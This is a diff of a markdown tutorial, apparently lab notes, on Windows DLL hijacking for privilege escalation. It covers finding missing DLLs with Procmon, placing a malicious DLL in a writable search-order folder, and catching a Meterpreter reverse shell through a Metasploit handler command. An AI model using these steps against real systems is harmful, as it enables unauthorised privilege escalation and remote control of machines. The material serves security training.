@@ -1,5 +1,5 @@
 ### What is DLL?
-**Dynamic Link Libraries (DLLs)** are libraries that contain data and procedures used by Windows applications and services, allowing the ***code to be used across multiple applications*** at any given time. This helps ***save disk space*** and allows applications to ***load faster*** due to code reuse.
+**Dynamic Link Libraries (DLLs)** are ***libraries that contain data and procedures used by Windows applications and services***, allowing the ***code to be used across multiple applications*** at any given time. This helps ***save disk space*** and allows applications to ***load faster*** due to code reuse.
 
 To be used for privilege escalation, the ***executable must be run by an administrator-level account***. Luckily, most services are launched by the SYSTEM account. 
 
@@ -44,8 +44,8 @@ Procmon (`Process Monitor`) is a Sysinternals tool that ***tracks real-time proc
 - **Identify privileged processes** (e.g., Administrator or SYSTEM) attempting to load missing DLLs.
 - **Check write access** to determine if you can place a malicious DLL in a location Windows will find.
 
-Name of the vulnerable process can be found under `Process -> Path`.
-Filename of the missing DLL can be found under `Event -> Path`.
+**Name of the vulnerable process can be found under `Process -> Path`.
+Filename of the missing DLL can be found under `Event -> Path`.**
 
 **Writable Folders**
 To exploit a missing DLL vulnerability, you must identify a writable folder in the DLL search order where you can place your malicious DLL.
@@ -74,6 +74,13 @@ msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse
 
 ### Replacement
 To exploit a DLL hijacking vulnerability, follow these steps based on the type of vulnerability you're targeting:
-- **Weak Permissions:** Overwrite the target DLL with your payload.
-- **DLL Search Order Hijack:** Place your malicious DLL in a folder higher in the DLL search order than the intended DLL.
+- **Weak Permissions:** Locate the target DLL and overwrite the target DLL with your payload.
+- **If you're attempting to hijack the search order of the DLL:** Place your malicious DLL in a location higher in the search path. 
 - **Missing DLL Exploit:** Add your DLL to a folder in the DLL search order (e.g., same folder as the executable).
+
+For example, if a process is looking for the missing DLL (e.g., `daily.dll`) file, adding the DLL to the same location as the original executable (e.g., `C:\Program Files\Backup Files\Daily Backup\daily.dll`) is enough for the process to find the "missing" DLL.
+
+Once you've added your DLL payload to the correct location, the next time the process attempts to access this DLL, your malicious code will be executed. For service processes, this might be when the service is next restarted (either manually or when the system reboots). However, some processes will load the library almost immediately as soon as the process detects the library exists – this'll entirely depend on the process that's being exploited.
+
+On the Kali desktop, open the terminal where your Metasploit listener is listening. If the process loads the library immediately, you'll gain a Meterpreter shell without needing to restart the target system. If the shell doesn't appear immediately, you'll need to restart the target. Once the Windows system has finished restarting, the service will also restart.
+
